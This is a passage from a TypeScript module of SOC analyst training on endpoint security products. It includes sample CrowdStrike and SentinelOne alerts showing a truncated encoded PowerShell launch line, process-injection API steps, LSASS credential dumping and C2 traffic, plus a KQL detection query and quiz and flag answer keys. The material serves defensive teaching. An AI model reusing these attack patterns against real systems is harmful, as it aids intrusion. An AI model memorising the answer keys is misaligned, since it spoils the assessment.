        "IOA (Indicator of Attack): A behavioral pattern that indicates an attack is in progress, regardless of whether the specific tools or files are known. An IOA says 'a process is injecting into lsass.exe with full access' — it does not care what the injecting process is called or whether its hash is in any database. IOAs detect the behavior of the attack, not the identity of the malware.\n\n" +
        "Key log fields you will encounter in SIEM when working with CrowdStrike events: crowdstrike.event.EventType identifies the category of event (DetectionSummaryEvent for alerts). crowdstrike.event.DetectId is the unique detection identifier in the format ldt:hexstring:number. crowdstrike.event.DetectDescription is the human-readable description of what was detected. crowdstrike.event.Severity is the numeric severity (1=Low, 2=Medium, 3=High, 4=Critical). crowdstrike.event.Tactic and crowdstrike.event.Technique map to MITRE ATT&CK. crowdstrike.event.FileName is the process that triggered the detection. crowdstrike.event.CommandLine is the full command line of that process. crowdstrike.event.ParentImageFileName is the parent process. crowdstrike.event.GrantedAccess is the Windows access rights mask used when opening another process's handle.",
      codeExample:
        "CROWDSTRIKE FALCON DETECTION EVENT — SIEM LOG FIELDS\n" +
        "======================================================\n\n" +
        "{\n" +
        '  "event.module": "crowdstrike",\n' +
        '  "event.dataset": "crowdstrike.falcon",\n\n' +
        "  // Detection metadata\n" +
        '  "crowdstrike.event.EventType": "DetectionSummaryEvent",\n' +
        '  "crowdstrike.event.DetectId": "ldt:c3b1f2a4e5d6:9988776655",\n' +
        '  "crowdstrike.event.DetectDescription": "Process injection: powershell.exe injected shellcode into explorer.exe",\n\n' +
        "  // MITRE ATT&CK mapping\n" +
        '  "crowdstrike.event.Tactic": "Defense Evasion",\n' +
        '  "crowdstrike.event.TacticId": "TA0005",\n' +
        '  "crowdstrike.event.Technique": "Process Injection: Portable Executable Injection",\n' +
        '  "crowdstrike.event.TechniqueId": "T1055.002",\n\n' +
        "  // Severity\n" +
        '  "crowdstrike.event.Severity": "4",\n' +
        '  "crowdstrike.event.SeverityName": "Critical",\n\n' +
        "  // Process info\n" +
        '  "crowdstrike.event.FileName": "powershell.exe",\n' +
        '  "crowdstrike.event.CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA...",\n' +
        '  "crowdstrike.event.ParentImageFileName": "WINWORD.EXE",\n' +
        '  "crowdstrike.event.ParentCommandLine": "WINWORD.EXE /n contract_2024.docm",\n\n' +
        "  // Injection target\n" +
        '  "crowdstrike.event.TargetProcessId": "3128",\n' +
        '  "crowdstrike.event.GrantedAccess": "0x1FFFFF",  // PROCESS_ALL_ACCESS\n\n' +
        "  // IOC\n" +
        '  "crowdstrike.event.IOCType": "hash_sha256",\n' +
        '  "crowdstrike.event.IOCValue": "7f3e1c9b8a2d4f6e0c5b3a1d9f7e5c2b...",\n\n' +
        "  // Host context\n" +
        '  "crowdstrike.event.NetworkContainmentState": "Not Contained",\n' +
        '  "crowdstrike.event.MachineDomain": "MEDCORE"\n' +
        "}\n\n" +
        "SEVERITY SCALE:\n" +
        "  1 = Low       (informational, review when time permits)\n" +
        "  2 = Medium    (investigate within shift)\n" +
        "  3 = High      (investigate within 30 minutes)\n" +
        "  4 = Critical  (immediate response required)\n\n" +
        "IOA vs IOC:\n" +
        "  IOC: hash 7f3e1c9b... is in the bad-hash database -> block\n" +
        "  IOA: ANY process writing to lsass.exe with 0x1FFFFF -> alert\n" +
        "       (even if the injector is a new, unknown tool)",
    },

    // ── Reading 8 ────────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r8",
      heading: "SentinelOne: AI-Native Detection and Storyline Technology",
      content:
        "SentinelOne is CrowdStrike's primary competitor in the enterprise EDR market, and it takes a distinctly different architectural approach. Understanding its key innovations helps you work effectively in environments where SentinelOne is deployed — and helps you understand the design tradeoffs in endpoint security products.\n\n" +
        "The defining innovation of SentinelOne is Storyline technology. When SentinelOne's agent monitors an endpoint, it does not just record individual events in isolation — it automatically links every process, file, and network event into a structured attack chain, called a Storyline, with a unique Storyline ID. Every event in an attack shares the same Storyline ID, so an analyst can pull up one record and immediately see the entire attack chain: the initial infection vector, every process spawned, every file created, every network connection made, and every registry change — all linked together automatically.\n\n" +
        "This is a significant operational difference from traditional EDR. In most SIEM environments, linking events into an attack chain requires manual investigation: find the first alert, look for related events by process ID, expand to parent process, search for network connections from that PID, and so on. SentinelOne's Storyline does this correlation automatically at the data collection layer, not at the analysis layer.\n\n" +
        "SentinelOne uses two AI detection engines. The first is Static AI: before a file executes, SentinelOne's on-device model analyzes it and assigns a maliciousness probability score. This works without cloud connectivity and without signatures — making it effective in air-gapped environments and against zero-day malware. The second is Behavioral AI (what SentinelOne calls ActiveEDR): after execution begins, the behavioral engine watches what the process actually does and compares it to learned patterns of malicious behavior. The combination catches different threat classes — static AI catches packed malware that looks suspicious even before it runs; behavioral AI catches fileless attacks that leave no suspicious file footprint.\n\n" +
        "Automated response in SentinelOne is more aggressive by default than CrowdStrike. SentinelOne can autonomously kill a malicious process, quarantine any files it created, and roll back file system changes without waiting for human approval. Rollback is accomplished by using Volume Shadow Copy Service (VSS) — SentinelOne can restore encrypted or deleted files from VSS snapshots, making it particularly effective against ransomware. An organization hit by ransomware with SentinelOne deployed has seen cases where thousands of encrypted files were restored in minutes automatically.\n\n" +
        "Ranger is SentinelOne's passive network discovery feature. Using data collected from deployed SentinelOne agents, Ranger discovers unmanaged devices on the network — printers, IoT devices, unmanaged workstations — without requiring network scanning or additional infrastructure.\n\n" +
        "Key SentinelOne log fields in SIEM: s1.event_type describes the event category. threat.info.classification indicates whether the threat was classified as Malware, PUA, or Suspicious Activity. threat.info.mitigationStatus shows whether the threat was mitigated, not mitigated, or marked as benign. src.process.name and src.process.commandline describe the source process. tgt.process.name describes the target process in injection scenarios. The Storyline ID appears as storyline.id and links all related events.",
      codeExample:
        "SENTINELONE STORYLINE — AUTOMATED ATTACK CHAIN VISUALIZATION\n" +
        "=============================================================\n\n" +
        "Storyline ID: S1-STR-20240918-9f3a2b1c\n" +
        "Start time:   2024-09-18T11:27:39Z\n" +
        "Endpoint:     WS-EXEC-022 | User: d.sharon\n" +
        "Status:       THREAT DETECTED | Mitigation: KILLED\n\n" +
        "[ROOT PROCESS]\n" +
        "WINWORD.EXE (pid 6312)\n" +
        "  Opened: contract_2024.docm\n" +
        "  |\n" +
        "  +-- [CHILD — SUSPICIOUS]\n" +
        "  |   powershell.exe (pid 9944)\n" +
        "  |   cmdline: -nop -w hidden -enc SQBFAFgA...\n" +
        "  |   Static AI score: 0.94 (MALICIOUS)\n" +
        "  |   |\n" +
        "  |   +-- [NETWORK EVENT]\n" +
        "  |   |   dst: 185.220.101.50:443\n" +
        "  |   |   bytes_out: 412 | Downloaded: stage2 payload\n" +
        "  |   |\n" +
        "  |   +-- [MEMORY INJECTION EVENT — CRITICAL]\n" +
        "  |       Target: explorer.exe (pid 3128)\n" +
        "  |       Access: 0x1FFFFF (PROCESS_ALL_ACCESS)\n" +
        "  |       Method: VirtualAllocEx + WriteProcessMemory\n" +
        "  |              + CreateRemoteThread\n" +
        "  |\n" +
        "  +-- [INJECTED CODE — running in explorer.exe]\n" +
        "      [NETWORK EVENT]\n" +
        "      dst: 185.220.101.50:443\n" +
        "      C2 beacon every 60 seconds\n\n" +
        "SENTINELONE AUTOMATED RESPONSE:\n" +
        "  11:27:52 - powershell.exe (pid 9944) KILLED\n" +
        "  11:27:52 - explorer.exe (pid 3128) SUSPENDED\n" +
        "  11:27:53 - No files to rollback (fileless attack)\n" +
        "  11:27:53 - Network connection to 185.220.101.50 BLOCKED\n" +
        "  11:27:53 - Alert sent to SOC: Storyline S1-STR-20240918-9f3a2b1c\n\n" +
        "ANALYST VIEW:\n" +
        "  One click on the Storyline ID shows the complete attack tree above.\n" +
        "  No manual log correlation required.",
    },

    // ── Reading 9 ────────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r9",
      heading: "Microsoft Defender XDR: The Microsoft Security Ecosystem",
      content:
        "Microsoft's endpoint security story has transformed dramatically over the past decade. What was once Windows Defender — a basic antivirus bundled with Windows 7 — has evolved into Microsoft Defender for Endpoint (MDE), a full-featured EDR platform that rivals CrowdStrike and SentinelOne. But MDE is just one component of a larger integrated platform: Microsoft Defender XDR.\n\n" +
        "Microsoft Defender for Endpoint is built on a sensor that is natively integrated into Windows 10 and Windows 11 — there is no separate agent to deploy. The sensor, called the MDE sensor, is built into the Windows kernel and uses the same ETW telemetry infrastructure. Microsoft's advantage here is obvious: no one understands Windows's internals better than Microsoft, and the sensor is maintained and updated through Windows Update automatically.\n\n" +
        "Attack Surface Reduction (ASR) rules are a distinctive MDE feature. ASR rules block specific behaviors known to be used by malware, regardless of whether a specific threat signature exists. Examples include: Block Office applications from creating child processes (prevents Word macro attacks), Block Office applications from injecting code into other processes, Block execution of potentially obfuscated scripts (catches encoded PowerShell), Block JavaScript or VBScript from launching downloaded executable content, and Block process creations originating from PSExec and WMI commands. ASR rules act as a behavioral pre-filter — many attacks are stopped at the ASR layer before EDR detection is even needed.\n\n" +
        "Tamper Protection locks down Defender's own configuration so that malware cannot disable it. Many ransomware strains attempt to disable AV/EDR as their first step. With Tamper Protection enabled, attempts to modify Defender's settings via the registry, PowerShell, or WMI are blocked — the changes require the Intune/MDE management portal.\n\n" +
        "The XDR stack brings together multiple products that Microsoft has built or acquired over the past decade. Microsoft Defender for Endpoint covers the endpoint layer (workstations, servers). Microsoft Defender for Office 365 covers email and collaboration (phishing, malicious attachments, BEC). Microsoft Defender for Identity covers Active Directory and Entra ID (credential attacks, lateral movement, Kerberoasting detection). Microsoft Defender for Cloud Apps (formerly MCAS) acts as a CASB — Cloud Access Security Broker — monitoring SaaS application usage. Microsoft Sentinel is the SIEM and SOAR layer that ingests data from all four and from external sources.\n\n" +
        "Microsoft processes more than 65 trillion security signals per day across this ecosystem. When an attack pattern is detected in one product, the threat intelligence propagates to all other products automatically.\n\n" +
        "Advanced Hunting is MDE's interactive threat hunting capability. Using KQL (Kusto Query Language), analysts can query 30 days of raw telemetry — every process creation, network connection, file event, and registry change — across all managed endpoints simultaneously. This is comparable to CrowdStrike's Threat Hunting and allows analysts to search for indicators of compromise across the entire fleet, not just the endpoints that generated an alert.",
      codeExample:
        "MICROSOFT DEFENDER XDR ARCHITECTURE\n" +
        "=====================================\n\n" +
        "SIGNAL SOURCES                 DEFENDER PRODUCTS\n" +
        "-------------                  -----------------\n" +
        "Endpoints (Win/Mac/Linux)  --> Microsoft Defender for Endpoint (MDE)\n" +
        "                               - EDR + EPP\n" +
        "                               - ASR Rules\n" +
        "                               - Tamper Protection\n" +
        "                               - Threat & Vulnerability Mgmt\n\n" +
        "Email (Exchange/O365)      --> Microsoft Defender for Office 365 (MDO)\n" +
        "                               - Anti-phishing / Safe Links\n" +
        "                               - Safe Attachments (sandbox)\n" +
        "                               - BEC / Account Takeover\n\n" +
        "Active Directory / Entra   --> Microsoft Defender for Identity (MDI)\n" +
        "                               - Kerberoasting detection\n" +
        "                               - Pass-the-Hash / DCSync\n" +
        "                               - Lateral movement\n\n" +
        "SaaS Apps (Salesforce,     --> Microsoft Defender for Cloud Apps (MDA)\n" +
        "  Box, Dropbox, etc.)          - CASB (Cloud Access Security Broker)\n" +
        "                               - Shadow IT discovery\n" +
        "                               - Impossible travel\n\n" +
        "ALL OF THE ABOVE           --> Microsoft Sentinel (SIEM + SOAR)\n" +
        "+ External sources             - KQL-based detection rules\n" +
        "  (Syslog, CEF, REST)         - Automated playbooks (Logic Apps)\n" +
        "                               - 30-day telemetry retention\n\n" +
        "ADVANCED HUNTING EXAMPLE (KQL):\n" +
        "  DeviceProcessEvents\n" +
        "  | where FileName == 'powershell.exe'\n" +
        "  | where ProcessCommandLine has '-enc'\n" +
        "  | where InitiatingProcessFileName in ('WINWORD.EXE', 'EXCEL.EXE')\n" +
        "  | project Timestamp, DeviceName, ProcessCommandLine,\n" +
        "            InitiatingProcessFileName\n" +
        "  -> Returns all Office->PowerShell -enc events in last 30 days\n\n" +
        "ASR RULE THAT WOULD BLOCK THIS ATTACK:\n" +
        "  Block Office applications from creating child processes\n" +
        "  Rule ID: D4F940AB-401B-4EFC-AADC-AD5F3C50688A\n" +
        "  Mode: Block (not audit)\n" +
        "  -> WINWORD.EXE attempt to spawn powershell.exe BLOCKED",
    },

    // ── Reading 10 ───────────────────────────────────────────────────────────
    {
      type: "reading" as const,
      id: "edr-r10",
      heading: "AV vs EDR vs XDR vs MDR: Complete Comparison and SOC Implications",
      content:
        "Having covered the history, architecture, and major vendors of endpoint security, it is worth stepping back to see the full picture: where does each tier of security fit, what does it actually provide, and what does it mean for you as a SOC analyst?\n\n" +
        "AV (Antivirus) is the baseline. It prevents known malware from executing using signatures, heuristics, and basic sandboxing. It has a local management console or is managed via a cloud dashboard. It generates alerts when malware is detected or quarantined. Management overhead is low — there is not much to configure, and most of the work is handled automatically. Cost is low (often included with the OS or available for a few dollars per endpoint per year). AV is appropriate for small businesses with no dedicated security staff, where the primary concern is commodity malware.\n\n" +
        "EDR adds continuous behavioral monitoring, process tree visibility, and active response capabilities. EDR sees what AV completely misses: fileless attacks, LOLBin abuse, credential dumping, lateral movement. EDR generates far more detailed alerts — not just 'malware detected' but 'PowerShell injected into LSASS with 0x1FFFFF access rights at 11:27:44.' EDR requires skilled analysts to review and act on those alerts. Management overhead is moderate — deployment, tuning detection rules, reviewing alerts. Cost is significantly higher than AV. EDR is appropriate for enterprises with at least a small security team.\n\n" +
        "XDR extends EDR across multiple security domains. Where EDR only sees the endpoint, XDR correlates signals from the endpoint, the email gateway, the network, and cloud applications. This matters because sophisticated attacks span multiple domains: the initial access comes via a phishing email, the attacker escalates privileges via Active Directory, and exfiltrates data via a cloud storage service. Each individual event might look suspicious in isolation; the correlation across domains reveals the full attack chain. XDR requires a larger, more mature security team and more infrastructure investment.\n\n" +
        "MDR (Managed Detection and Response) is not a technology tier but a service model. An MDR provider gives you EDR or XDR technology AND the security team to operate it — analysts monitoring your environment 24 hours a day, 7 days a week, 365 days a year. For organizations that cannot build their own SOC (too expensive, cannot find the talent), MDR provides enterprise-grade detection and response through a subscription. The MDR team handles alert triage, investigation, and often initial response actions.\n\n" +
        "For SOC analysts, the tier of security in your environment determines what you can see and what you are expected to do. If your organization only has AV, attackers using LOLBins are literally invisible — your most important conversation with management is about EDR deployment. If you have EDR, you see the attacks but you need trained analysts to review and respond — your most important metric is your mean time to respond to Critical alerts. If you have XDR, you have cross-domain visibility and must build detection rules that correlate signals across sources.",
      codeExample:
        "ENDPOINT SECURITY COMPARISON MATRIX\n" +
        "=====================================\n\n" +
        "                    AV          EDR         XDR         MDR\n" +
        "                    --------    --------    --------    --------\n" +
        "Detection method    Signature   Behavioral  Cross-      Human +\n" +
        "                    Heuristic   IOA/IOC     domain AI   AI\n\n" +
        "What it sees        Files on    Full OS     Endpoint    Everything\n" +
        "                    disk        telemetry   + Email     + Human\n" +
        "                                           + Network   judgment\n" +
        "                                           + Cloud\n\n" +
        "Response            Quarantine  Isolate     Automated   24x7 SOC\n" +
        "capability          file        host        cross-      team acts\n" +
        "                               Kill proc   domain      on your\n" +
        "                               Rollback    playbooks   behalf\n\n" +
        "Fileless malware    BLIND       Detected    Detected    Detected\n" +
        "LOLBin abuse        BLIND       Detected    Detected    Detected\n" +
        "Phishing email      BLIND       BLIND       Detected    Detected\n" +
        "Lateral movement    BLIND       Detected    Correlated  Detected\n" +
        "Supply chain        BLIND       Partial     Better      Best\n\n" +
        "Management effort   Low         Medium      High        None\n" +
        "                    (vendor     (tuning +   (complex    (outsourced)\n" +
        "                    managed)    analysts)   rules)\n\n" +
        "Cost tier           $           $$          $$$         $$$\n" +
        "                    (included   (per-seat   (platform   (annual\n" +
        "                    or cheap)   license)    license)    contract)\n\n" +
        "Best for            SMB no      Enterprise  Enterprise  Org without\n" +
        "                    sec staff   with SOC    with mature own SOC\n" +
        "                                           SOC\n\n" +
        "KEY RULE FOR SOC ANALYSTS:\n" +
        "  If only AV deployed:  LOLBin attackers are INVISIBLE to you.\n" +
        "                        Advocate immediately for EDR deployment.\n" +
        "  If EDR deployed:      You see everything. You need analysts.\n" +
        "                        MTTD and MTTR are your critical metrics.\n" +
        "  If XDR deployed:      Build cross-domain detection rules.\n" +
        "                        One phish + one endpoint event = full story.",
    },

    // ── Question 1 ───────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "edr-q1",
      question:
        "An attacker uses PowerShell with a base64-encoded payload to download and execute malware entirely in memory, without writing any file to disk. Which endpoint security technology is BEST suited to detect this?",
      options: [
        "Traditional signature-based AV — it scans all running processes for known malware signatures",
        "EDR with AMSI integration — it hooks into the PowerShell engine and scans the decoded script before execution",
        "A perimeter firewall — it blocks the download of malicious payloads from the internet",
        "Windows Defender Firewall — it blocks PowerShell from making outbound network connections",
      ],
      answer: 1,
      explanation:
        "Fileless malware running entirely in memory bypasses signature-based AV because there is no file to scan. EDR with AMSI (Antimalware Scan Interface) integration hooks into the PowerShell execution engine and scans the decoded script content before it runs — even if the payload was base64-encoded. This allows detection even when no file is written to disk. The perimeter firewall and host firewall can block network connections but cannot inspect the script content.",
      xp: 25,
    },

    // ── Question 2 ───────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "edr-q2",
      question:
        "In the context of EDR, what is a 'Living-Off-the-Land' (LOLBin) attack, and why does it evade traditional AV?",
      options: [
        "An attack that uses malware with no persistent mechanism, making it harder to remove",
        "An attack that abuses legitimate Windows tools like PowerShell, WMI, or certutil.exe to execute malicious code — the tools themselves are trusted by AV",
        "An attack that targets agricultural or industrial control systems",
        "An attack launched from within the corporate network, bypassing perimeter defenses",
      ],
      answer: 1,
      explanation:
        "LOLBin (Living-Off-the-Land Binary) attacks use legitimate, pre-installed Windows tools to perform malicious actions. PowerShell, WMI, certutil.exe, and regsvr32.exe are all signed Microsoft binaries trusted by AV. Traditional AV sees 'powershell.exe' and considers it safe — it cannot detect that the PowerShell script being executed is malicious. EDR detects LOLBin abuse by analyzing BEHAVIOR: PowerShell spawning from Word, PowerShell connecting to an external IP, PowerShell injecting into another process.",
      xp: 25,
    },

    // ── Question 3 ───────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "edr-q3",
      question:
        "What does GrantedAccess 0x1FFFFF mean in a CrowdStrike EDR alert about LSASS access?",
      options: [
        "Read-only access was granted to LSASS — the attacker can read but not dump credentials",
        "PROCESS_ALL_ACCESS was granted — the attacker has full control of LSASS and can dump all credential hashes",
        "The access was denied — 0x1FFFFF is the Windows error code for ACCESS_DENIED",
        "The process created a new thread in LSASS using standard thread creation permissions",
      ],
      answer: 1,
      explanation:
        "GrantedAccess 0x1FFFFF is the hexadecimal value for PROCESS_ALL_ACCESS in Windows. This grants the caller ALL possible permissions over the target process (in this case LSASS). With PROCESS_ALL_ACCESS, an attacker can use MiniDumpWriteDump() to dump all credentials stored in LSASS memory — extracting NTLM hashes and Kerberos tickets. This is the LSASS credential dumping technique (MITRE T1003.001). Any process accessing LSASS with GrantedAccess 0x1FFFFF should be treated as credential dumping until proven otherwise.",
      xp: 25,
    },

    // ── Log Analysis ─────────────────────────────────────────────────────────
    {
      type: "log_analysis" as const,
      id: "edr-la1",
      heading: "CrowdStrike Alert: PowerShell Injecting into Explorer.exe",
      context:
        "You are a Tier-1 SOC analyst at MedCore Health. A Critical CrowdStrike Falcon alert fires on WS-EXEC-022, belonging to a hospital executive. The alert severity is 4 (Critical). Looking at the crowdstrike.event.ParentCommandLine field, you can see the user had a Word document open: contract_2024.docm. The .docm extension means it is a macro-enabled Word document. PowerShell was then spawned and injected shellcode into explorer.exe. This is a macro-based malware execution chain.",
      event: edrInjectEvent,
      questions: [
        {
          question:
            "The PowerShell CommandLine shows '-nop -w hidden -enc'. What do these three flags indicate?",
          options: [
            "Normal PowerShell flags used by system administrators for scheduled tasks",
            "-nop disables execution policy bypass, -w hidden opens a minimized window, -enc enables enhanced logging — all legitimate administrative flags",
            "-nop bypasses execution policy (NoProfile), -w hidden hides the window (WindowStyle Hidden), -enc executes a base64-encoded payload — the combination is almost exclusively used by malware",
            "These flags indicate PowerShell is running in a sandboxed container for security testing",
          ],
          answer: 2,
          explanation:
            "-nop (NoProfile) skips loading the user's PowerShell profile, preventing logging hooks. -w hidden (WindowStyle Hidden) makes the PowerShell window invisible to the user. -enc (EncodedCommand) accepts a base64-encoded command string, obfuscating the actual payload from casual inspection. This combination — no profile + hidden + base64 encoded — is the most common PowerShell malware launch pattern. Legitimate administrative scripts almost never need all three flags simultaneously.",
          xp: 25,
        },
        {
          question:
            "The crowdstrike.event.GrantedAccess value is 0x1FFFFF and the TargetProcessId is 3128. What has the malware done to explorer.exe?",
          options: [
            "The malware added explorer.exe to the Windows Defender exclusion list",
            "The malware opened explorer.exe with PROCESS_ALL_ACCESS permissions, allowing it to inject shellcode into the explorer process — using explorer.exe as a host to hide malicious code",
            "The malware terminated explorer.exe to prevent the user from using the desktop",
            "The malware created a new process called explorer.exe to replace the legitimate one",
          ],
          answer: 1,
          explanation:
            "TargetProcessId 3128 is the PID of the target process (explorer.exe). GrantedAccess 0x1FFFFF = PROCESS_ALL_ACCESS means PowerShell opened a handle to explorer.exe with every possible permission. This is the classic process injection setup: malware allocates memory in the target process (VirtualAllocEx), writes shellcode (WriteProcessMemory), and executes it (CreateRemoteThread). The injected code now runs INSIDE explorer.exe — a trusted Windows process — making it much harder to detect and kill.",
          xp: 25,
        },
        {
          question:
            "What is the analyst's recommended IMMEDIATE response sequence for this Critical EDR alert?",
          options: [
            "Send an email to the user asking if they opened a suspicious document, then wait for their response before taking action",
            "Document the finding and escalate to Tier-2 for review during the next business day",
            "Immediately isolate WS-EXEC-022 via CrowdStrike's Network Containment feature, preserve the process memory dump, identify the C2 IP from network logs, and block it in the firewall",
            "Run a full AV scan on WS-EXEC-022 and quarantine any detected files before considering further action",
          ],
          answer: 2,
          explanation:
            "Critical EDR alerts require immediate containment. Step 1: Network Containment via CrowdStrike — isolates the host from all network access (the agent still communicates with Falcon) within seconds, stopping C2 and lateral movement. Step 2: Preserve evidence — process memory dump, volatile artifacts before they disappear. Step 3: Identify C2 — check network logs for connections from WS-EXEC-022 to external IPs around the alert time. Step 4: Block C2 IPs in firewall. Running AV after the fact is insufficient — the malware is already in memory and AV will not detect fileless code.",
          xp: 25,
        },
      ],
    },

    // ── Flag ─────────────────────────────────────────────────────────────────
    {
      type: "flag" as const,
      id: "edr-f1",
      prompt:
        "Look at the CrowdStrike log event. Find the unique DetectId that CrowdStrike assigned to this detection. It follows the format ldt:hexstring:number.",
      answer: "ldt:c3b1f2a4e5d6:9988776655",
      hint: "Look in the raw field for crowdstrike.event.DetectId.",
      xp: 30,
    },
  ],
};

export default [avVsEdrMasterclass];
